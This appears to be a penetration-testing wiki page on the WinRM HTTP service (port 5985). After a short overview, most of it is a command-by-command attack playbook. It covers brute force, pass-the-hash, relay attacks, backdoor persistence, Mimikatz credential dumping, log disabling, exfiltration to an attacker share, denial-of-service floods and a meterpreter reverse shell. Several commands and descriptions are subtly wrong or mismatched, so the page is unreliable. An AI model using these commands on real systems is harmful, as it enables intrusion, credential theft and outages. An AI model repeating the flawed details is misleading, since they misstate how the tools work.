# P5985 WinRM HTTP

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P5986 WinRM HTTPS]]

## Windows Remote Management (WinRM) HTTP

* **Port Number:** 5985 (HTTP), 5986 (HTTPS)
* **Protocol:** TCP
* **Service Name:** Windows Remote Management (WinRM)
* **Defined in:** Microsoft Documentation (various versions, initially introduced in Windows Server 2003 R2)

Windows Remote Management (WinRM) is a Microsoft protocol that allows for remote management and administration of Windows systems. It is based on the Web Services-Management (WS-Management) protocol, which is a standard developed by the Distributed Management Task Force (DMTF). WinRM provides a secure and extensible interface for remotely executing scripts, managing system configurations, and gathering data from Windows machines.

### Overview of Features

* **Secure Communication:** WinRM supports both HTTP (port 5985) and HTTPS (port 5986), with HTTPS providing encrypted communication via SSL/TLS.
* **WS-Management Protocol:** Implements the WS-Management protocol, which is a standard for managing hardware and software across various operating systems.
* **Interoperability:** WinRM can manage and monitor a wide range of devices and systems, including those that are not running Windows, by using the WS-Management protocol.
* **Remote Execution:** Allows for the execution of PowerShell commands and scripts on remote machines, facilitating administrative tasks across large networks.
* **Integration with PowerShell:** WinRM is deeply integrated with PowerShell, enabling powerful remote scripting and automation capabilities.
* **Firewall-Friendly:** Designed to operate over common HTTP/HTTPS ports, making it easier to work within network security policies.

### Typical Use Cases

* **Remote System Management:** Centralized management of Windows servers and workstations from a remote location.
* **Automation:** Executing scripts and commands across multiple machines without needing direct access or interactive login.
* **Configuration Management:** Automating the deployment and configuration of Windows systems across a network.
* **Monitoring and Logging:** Gathering logs and system data remotely for auditing and monitoring purposes.
* **Incident Response:** Quickly responding to security incidents by executing commands and gathering data remotely.

### How WinRM HTTP Works

1. **Service Initialization:**
   * **Step 1:** The WinRM service is started on the Windows system, listening on port 5985 for HTTP and optionally on port 5986 for HTTPS.
   * **Step 2:** The service registers with the Windows HTTP Server API (HTTP.sys) to handle incoming HTTP requests.
2. **Connection Establishment:**
   * **Step 3:** A remote client (often using PowerShell or a management tool) sends an HTTP request to the target system’s WinRM service on port 5985.
   * **Step 4:** The target system’s HTTP.sys layer receives the request and forwards it to the WinRM service.
3. **Authentication:**
   * **Step 5:** The WinRM service processes the incoming request, starting with an authentication check. WinRM supports multiple authentication methods, including Kerberos, NTLM, and basic authentication (if configured).
   * **Step 6:** If authentication is successful, the request is passed to the appropriate management endpoint.
4. **Data Transmission:**
   * **Step 7:** The WinRM service executes the requested command or script on the target system. This could involve running a PowerShell script, querying system data, or modifying configurations.
   * **Step 8:** The service collects the results of the command and prepares an HTTP response.
   * **Step 9:** The response, containing the command output or requested data, is sent back to the client over the same HTTP connection.
5. **Connection Termination:**
   * **Step 10:** The HTTP connection is gracefully closed after the response is sent, although persistent sessions can be maintained for ongoing communication.
6. **HTTPS Communication** (if enabled):
   * **Step 11:** For more secure communication, the client connects to the WinRM service over HTTPS (port 5986).
   * **Step 12:** An SSL/TLS handshake is performed, ensuring that the connection is encrypted before data transmission begins.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>:<attack_port>` sends a WinRM command to `<target_ip>:5985`
* **Server:** `<target_ip>` authenticates the request, executes the command, and returns the result to `<attack_ip>`.
* **Client:** `<attack_ip>` receives the result and processes it.

## Additional Information

### Security Considerations

* **Authentication Mechanisms:** WinRM supports several authentication methods, with Kerberos being the most secure in a domain environment. NTLM and basic authentication are less secure, particularly in environments where HTTPS is not enforced.
* **Firewall Configuration:** WinRM operates over common HTTP/HTTPS ports (5985/5986), which may need to be explicitly allowed in firewalls, especially in tightly controlled environments.
* **Encryption:** By default, WinRM over HTTP (5985) is not encrypted. It’s recommended to use HTTPS (5986) to protect data in transit.
* **Access Control:** Access to WinRM should be tightly controlled using Group Policy or local security policies to prevent unauthorized access.

### Advanced Usage

* **Custom Scripts:** Admins often write custom PowerShell scripts that leverage WinRM to automate complex tasks across multiple machines.
* **Integration with Other Tools:** WinRM is often integrated with tools like Ansible, SCCM, and custom management scripts to provide scalable management solutions.

### Configuration Files

WinRM configurations are managed via the Windows command line or PowerShell, and specific settings are stored within the Windows registry and WinRM configuration files.

1. **Registry Location:**

* **File Location:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN`
* **Description:** The registry holds key settings for the WinRM service, including listener configurations, security settings, and transport protocols.

2. **WinRM Configuration:**

*   **Command to View Config:**

    ```powershell
    winrm get winrm/config
    ```
* **Description:** Displays the current configuration settings for WinRM, including transport protocols, authentication settings, and timeouts.

3. **Common Configuration Settings:**

| **Setting**           | **Description**                                                              |
| --------------------- | ---------------------------------------------------------------------------- |
| `MaxConcurrentUsers`  | Specifies the maximum number of concurrent users who can access the service. |
| `MaxConnections`      | Defines the maximum number of connections allowed.                           |
| `MaxMemoryPerShellMB` | Limits the memory usage for each remote shell session.                       |
| `MaxTimeoutms`        | Defines the maximum time a remote shell can run before it times out.         |

### Potential Misconfigurations

1. **Unsecured HTTP Communication:**
   * **Risk:** Using HTTP instead of HTTPS can expose sensitive data to eavesdropping and man-in-the-middle attacks.
   * **Exploitation:** An attacker on the network can intercept WinRM traffic and potentially extract credentials or command output.
2. **Weak Authentication Settings:**
   * **Risk:** Enabling basic or NTLM authentication without encryption can lead to credential theft.
   * **Exploitation:** An attacker can capture NTLM hashes or plaintext credentials and use them in pass-the-hash or brute-force attacks.
3. **Exposed WinRM Service to the Internet:**
   * **Risk:** Exposing WinRM to the internet without proper security controls can make it a target for attacks.
   * **Exploitation:** Attackers can perform brute-force attacks against the WinRM service or exploit vulnerabilities in unpatched systems.
4. **Improper Access Control:**
   * **Risk:** Not restricting who can access WinRM may allow unauthorized users to execute commands remotely.
   * **Exploitation:** Unauthorized users could gain access to critical systems and execute arbitrary commands or scripts.

### Default Credentials

WinRM does not have default credentials since it relies on Windows authentication. However, when using basic authentication in non-domain environments, credentials might be required:

## Interaction and Tools

### Tools

#### \[\[WinRM Cheat Sheet]]

*   **Start WinRM Service:** Starts the WinRM service if it is not already running.

    ```powershell
    Start-Service -Name WinRM
    ```
*   **Check WinRM Service Status:** Retrieves the current status of the WinRM service (e.g., running, stopped).

    ```powershell
    Get-Service -Name WinRM
    ```
*   **Enabling WinRM:** Enables WinRM service on the local machine, allowing remote connections.

    ```powershell
    Enable-PSRemoting -Force
    ```
*   **Check WinRM Status:** Lists all configured WinRM listeners and their current status.

    ```powershell
    winrm enumerate winrm/config/listener
    ```
*   **Create an HTTPS Listener:** Configures WinRM to listen for connections over HTTPS.

    ```powershell
    winrm quickconfig -transport:http
    ```
*   **Add TrustedHost:** Allow a specific IP to manage the system via WinRM.

    ```powershell
    winrm set winrm/config/client @{TrustedHosts="192.168.1.100"}
    ```
*   **Set Custom WinRM Port:** Description:\*\* Changes the default port for WinRM communication to a custom port, improving security by avoiding well-known ports.

    ```powershell
    Set-Item -Path WSMan:\localhost\Service\Listeners\Listener*\Port -Value 4443
    ```
*   **Test WinRM Connection:** Tests the connectivity to a remote WinRM service, ensuring that it’s reachable.

    ```powershell
    Test-WsMan <target_ip>
    ```
*   **Connect to Remote Machine:** Initiates a remote session with the target machine using the specified credentials.

    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Credential <username>
    ```
*   **Executing Remote Commands:** Executes the `Get-Process` command on the remote machine and returns the results to the local session.

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-Process}
    ```
* **Batch Command Execution:** Executes multiple commands in a single session, useful for gathering various types of information from a remote machine.

```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Service; Get-EventLog -LogName System }
```

*   **Persistent Sessions:** Creates a persistent session on the remote machine for executing multiple commands without re-authentication.

    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    Invoke-Command -Session $session -ScriptBlock {Get-Service}
    ```
*   **Copying Files Remotely:** Copies files from the local machine to the remote machine over the established WinRM session.

    ```powershell
    Copy-Item -Path "C:\local\file.txt" -Destination "C:\remote\path\" -ToSession $session
    ```
*   **Set Custom WinRM Settings:** Configures WinRM to disallow unencrypted connections, enforcing HTTPS only.

    ```powershell
    winrm set winrm/config/service '@{AllowUnencrypted="false"}'
    ```

#### \[\[4. Tool Guides/Incomplete/PowerShell]]

*   **Execute Remote Command:** Execute remote commands and scripts, gathering data, and managing configurations.

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-Service}
    ```

#### Windows Admin Center

* **Description:** A web-based tool for managing Windows servers that uses WinRM under the hood for communication.
* **Use Case:** Provides a graphical interface for managing servers, including remote management tasks like service monitoring and configuration.

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 5985"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 5985
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 5985
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 5985 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 5985
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 5985 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:5985
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p 5985
    ```

#### \[\[Evil-WinRM Cheat Sheet]]

*   **Connect to a host:**

    ```bash
    evil-winrm --ip <target_ip> --user <username> --password <password>
    ```
*   **Connect to a host, passing the password hash:**

    ```bash
    evil-winrm --ip <target_ip> --user <username> --hash <nt_hash>
    ```
*   **Connect to a host, specifying directories for scripts and executables:**

    ```bash
    evil-winrm --ip <target_ip> --user <username> --password <password> --scripts <path_to_scripts> --executables <path_to_executables>
    ```
*   **Connect to a host, using SSL:**

    ```bash
    evil-winrm --ip <target_ip> --user <username> --password <password> --ssl --pub-key <path_to_pubkey> --priv-key <path_to_privkey>
    ```
*   **Upload a file to the host:**

    ```bash
    PS > upload <path_to_local_file> <path_to_remote_file>
    ```
*   **Get a list of loaded PowerShell functions:**

    ```bash
    PS > menu
    ```
*   **Load a PowerShell script from the --scripts directory:**

    ```bash
    PS > <script.ps1>
    ```
*   **Invoke a binary on the host from the --executables directory:**

    ```bash
    PS > Invoke-Binary <binary.exe>
    ```

#### \[\[CrackMapExec]]

*   **WinRM Authentication Testing Credentials:**

    ```c
    crackmapexec winrm <target_ip> -u <username> -p `<password>'
    ```
*   **If the SMB port is closed you can also use the flag `-d` DOMAIN to avoid an SMB connection:**

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>'
    ```
*   **Brute Force:** Just check a pair of credentials

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username_wordlist> -p `<password_wordlist>'
    ```
*   **Username + Password + CMD command execution:**

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>' -x "whoami"
    ```
*   **Username + Hash + PS command execution:** CrackMapExec won't give you an interactive shell, but it will check if the creds are valid to access WinRM

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username> -H `<ntlm_hash> -X '$PSVersionTable'
    ```
*   **Password Spraying (without brute force):** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username_wordlist> -p `<password_wordlist>' --no-bruteforce
    ```
*   **Defeating LAPS:** Using CrackMapExec when LAPS installed on the domain. If LAPS is used inside the domain, it can be hard to use CrackMapExec to execute a command on every computer on the domain. Therefore, a new core option has been added `--laps`! If you have compromised an accout that can read LAPS password you can use CrackMapExec like this. If the default administrator name is not administrator add the user after the option `--laps name`.

    ```c
    crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>' --laps
    ```

#### \[\[Impacket]]

**\[\[Impacket-WMIExec]]**

*   **Connect via WMIExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against Kerberos instead of NTLM.

    ```bash
    impacket-wmiexec <domain>/<username>:'<password>'@<target_ip>
    impacket-wmiexec -hashes LM:NT <username>@<target_ip>
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 5985
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 5985
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Pass-the-Hash

*   **Tool:** \[\[CrackMapExec]]

    ```bash
    crackmapexec winrm <target_ip> -u <username> -H <NTLM_hash>
    ```
* **Description:** Uses an NTLM hash to authenticate with the WinRM service without needing the plaintext password.

#### \[\[Relay Attacks]]

*   **Tool:** \[\[Responder Cheat Sheet]], \[\[Impacket-NTLMRelayX Cheat Sheet]]

    ```bash
    impacket-ntlmrelayx -tf targets.txt
    sudo responder -I <interface>
    ```
* **Description:** Relay captured credentials to the target service, potentially gaining unauthorized access.

### Persistence

#### Adding a New WinRM Listener

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    winrm create winrm/config/Listener?Address=*+Transport=HTTP
    ```
* **Description:** Create an additional WinRM listener on a different port to maintain persistent access.

#### Creating a Persistent Session

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    ```
* **Description:** Establishes a persistent remote session that can be re-used for multiple commands, maintaining access over time.

#### Creating Scheduled Tasks

* **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

```powershell
schtasks /create /tn "WinRM Backdoor" /tr "powershell.exe -Command 'Start-Process powershell.exe -ArgumentList Enter-PSSession -ComputerName <target_ip> -UseSSL'" /sc onstart
```

* **Description:** Schedules a task to re-enable or maintain a persistent WinRM session upon system reboot.

#### Creating Services

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    New-Service -Name "MaliciousWinRM" -Binary "malicious.exe" -DisplayName "WinRM Backup"
    ```
* **Description:** Register a malicious service that provides persistent access through WinRM.

#### Installing Backdoors

*   **Tool:** \[\[Evil-WinRM Cheat Sheet]]

    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -s backdoor.ps1
    ```
* **Description:** Executes a PowerShell script to install a backdoor on the remote machine for persistent access.

#### Backdoor Creation

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'C:\backdoor.exe'
    ```
* **Description:** Configures a persistent backdoor to be executed on startup, ensuring continued access even if WinRM is disabled.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 5985"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### Capturing Credentials via Evil-WinRM

*   **Tool:** \[\[Evil-WinRM Cheat Sheet]]

    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> --sam
    ```
* **Description:** Extract credentials from the Security Account Manager (SAM) database on the target system.

#### Extracting Credentials via PowerShell

*   **Tool:** \[\[Mimikatz Cheat Sheet]]

    ```powershell
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
    ```
* **Description:** Executes Mimikatz on the remote machine to dump plaintext credentials or hashes.

### Privilege Escalation

#### Exploiting Misconfigured Services

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Get-Service -Name <vulnerable_service> | Set-Service -StartupType Automatic
    ```
* **Description:** Identifies and exploits misconfigured services that can be manipulated to escalate privileges.

#### Bypassing UAC

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Start-Process cmd -Verb RunAs }
    ```
* **Description:** Attempts to bypass User Account Control (UAC) to gain elevated privileges on the remote machine.

### Internal Reconnaissance

#### Gathering System Information

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-SystemInfo}
    ```
* **Description:** Collects detailed system information from the remote machine to aid in further attacks.

#### Network Mapping via WinRM

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Test-NetConnection -ComputerName <other_ip> -Port 5986
    ```

\


````
```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock {Test-Connection -ComputerName (1..254 | ForEach-Object {"192.168.1.$_"})}
```
````

* **Description:** Maps internal network hosts from the remote machine by pinging them via WinRM.

#### Service Enumeration

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Get-Service -ComputerName <target_ip> -UseSSL
    ```
* **Description:** Enumerates all running services on the remote machine to identify potential targets for exploitation.

### Lateral Movement, Pivoting, and Tunnelling

#### Using WinRM for Lateral Movement

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]], \[\[Evil-WinRM Cheat Sheet]]

    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> --exec 'Enter-PSSession -ComputerName <next_target_ip>'
    ```
* **Description:** Move laterally through the network by establishing WinRM sessions with additional hosts.

#### Pivoting via PowerShell Remoting

*   **Tool:** PowerShell

    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    Invoke-Command -Session $session -ScriptBlock {New-PSSession -ComputerName <next_target_ip>}
    ```
* **Description:** Establishes a session on a new target by pivoting through an existing WinRM session.

#### WinRM Tunneling

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L 5985:<target_ip>:5985 user@jump_host
    ```
* **Description:** Tunnels WinRM traffic through an SSH connection to bypass network restrictions and reach the target.

### Defense Evasion

#### Obfuscating PowerShell Commands

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5zdGFsbCAtbW9kdWxlIFBob3Rvbi1CbG9n==')))}
    ```

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aGVsbG8gd29ybGQ=")) }
    ```
* **Description:** Obfuscates PowerShell commands sent via WinRM to avoid detection by security tools.

#### Using Encoded Commands

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    powershell.exe -encodedCommand <encoded_command>
    ```
* **Description:** Execute commands in an encoded format to bypass command-line logging and detection mechanisms.

#### Using Alternate Credentials

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    $cred = Get-Credential
    Invoke-Command -ComputerName <target_ip> -Credential $cred -ScriptBlock {Get-Service}
    ```
* **Description:** Executes commands using alternate credentials to avoid triggering alarms associated with certain accounts.

#### Disabling Event Logs

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { Stop-Service -Name 'EventLog' }
    ```
* **Description:** Disables event logging on the target machine to evade detection.

#### Disabling WinRM Logging

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    wevtutil.exe sl Microsoft-Windows-WinRM/Operational /e:false
    ```
* **Description:** Disable logging for the WinRM service to avoid detection by security monitoring systems.

### Data Exfiltration

#### Staging Data for Exfiltration

* **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

```powershell
Compress-Archive -Path "C:\Sensitive\*" -DestinationPath "C:\Temp\archive.zip"
Invoke-Command -ComputerName <target_ip> -ScriptBlock { Copy-Item "C:\Temp\archive.zip" -Destination "\\<attacker_ip>\share" }
```

* **Description:** Compress and stage data on a remote machine before exfiltrating it through a shared resource.

#### Exfiltrating Data via WinRM

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Content C:\SensitiveData.txt | Out-File -FilePath C:\inetpub\wwwroot\exfiltrated_data.txt -Force }
    ```
* **Description:** Reads sensitive data from the remote machine and saves it locally for exfiltration.

#### Using PowerShell Remoting for Exfiltration

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Copy-Item -Path C:\sensitive_data.txt -Destination C:\Users\Public -Force }
    ```
* **Description:** Copies sensitive data to a publicly accessible location for later retrieval.

#### Exfiltrating Data via Evil-WinRM

*   **Tool:** \[\[Evil-WinRM Cheat Sheet]]

    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> --upload <local_file> <remote_path>
    ```
* **Description:** Upload sensitive data from the target system to a remote location for exfiltration.

#### Stealthy Data Exfiltration

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { $data = Get-Content C:\SensitiveData.txt; foreach ($char in $data) { Write-Host $char -NoNewline; Start-Sleep -Milliseconds 50 } }
    ```
* **Description:** Exfiltrates data character by character to avoid large, detectable transfers.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s 5985 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s 5985 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Offline Hash Cracking

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

\


*   **Tool:** \[\[HashCat Cheat Sheet]]

    ```bash
    hashcat -m <mode> <hash_file> <path/to/wordlist>
    ```
* **Description:** Cracks dumped password hashes to gain access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 5985 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 5985 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### Memory Exhaustion via WinRM

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {while ($true) {1..10000 | % {Start-Process "notepad"}}}
    ```
* **Description:** Exhausts system memory by repeatedly launching processes via WinRM, leading to a denial of service.

#### Service Crashing

*   **Tool:** \[\[Scapy]]

    ```bash
    from scapy.all import *
    packet = IP(dst="<target_ip>")/TCP(dport=5985,flags="S")/("A"*65000)
    send(packet, loop=1)
    ```
* **Description:** Send malformed or oversized packets to the WinRM service, potentially causing it to crash.

### Exploits

#### WinRM Script Execution Vulnerability

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Start-Process cmd -ArgumentList '/c whoami'}
    ```
* **Description:** Exploits misconfigurations in WinRM to execute arbitrary scripts and commands with elevated privileges.

#### Exploiting WinRM for Remote Code Execution

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/winrm/winrm_rce
    set RHOST <target_ip>
    set PAYLOAD windows/meterpreter/reverse_tcp
    run
    ```
* **Description:** Exploit known vulnerabilities in the WinRM service to achieve remote code execution on the target system.

## Resources

| **Website**                   | **URL**                                                                              |
| ----------------------------- | ------------------------------------------------------------------------------------ |
| Microsoft WinRM Documentation | https://docs.microsoft.com/en-us/windows/winrm/                                      |
| PowerShell Remoting Guide     | https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/                |
| Evil-WinRM GitHub             | https://github.com/Hackplayers/evil-winrm                                            |
| Nmap WinRM Script             | https://nmap.org/nsedoc/scripts/http-winrm-enum.html                                 |
| Metasploit WinRM Module       | https://www.rapid7.com/db/modules/auxiliary/scanner/winrm/winrm\_login               |
| Wireshark Official Site       | https://www.wireshark.org/                                                           |
| LOIC Source Code              | https://github.com/NewEraCracker/LOIC                                                |
| CrackMapExec Documentation    | https://mpgn.gitbook.io/crackmapexec/                                                |
| Windows Admin Center          | https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/overview |
